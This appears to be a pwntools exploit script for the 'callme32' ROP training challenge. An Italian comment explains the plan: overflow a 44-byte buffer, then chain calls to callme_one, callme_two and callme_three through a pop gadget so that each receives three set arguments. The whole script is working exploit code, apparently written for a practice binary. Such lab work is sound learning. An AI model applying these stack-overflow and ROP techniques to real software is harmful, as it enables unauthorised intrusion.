from pwn import *

elf = ELF("./callme32")

p = process("./callme32")
p.recvline()

"""
    Per questo esercizio dobbiamo chiamare le tre funzioni 'callme_one','callme_two' e 'callme_three' in
    quest'ordine, ognuna con i tre parametri 0xdeadbeef, 0xcafebabe e 0xdoodfood.
    In questa versione gli argomenti vengono passati direttamente nello stack, di conseguenza prima di inserire gli argomenti
    nello stack dobbiamo ricordarci di toglierli per le chiamate alle funzioni successive. Per fare ci√≤ utilizzeremo il gadget 
    che fa i pop di ESI, EDI e EBP.
"""

pop_esi_pop_edi_pop_ebp = p32(0x080487f9)
args = p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)

payload = b''
payload += p32(elf.symbols['callme_one']) + pop_esi_pop_edi_pop_ebp + args
payload += p32(elf.symbols['callme_two']) + pop_esi_pop_edi_pop_ebp + args
payload += p32(elf.symbols['callme_three']) + pop_esi_pop_edi_pop_ebp + args


p.send(cyclic(44) + payload)
					   

p.interactive()
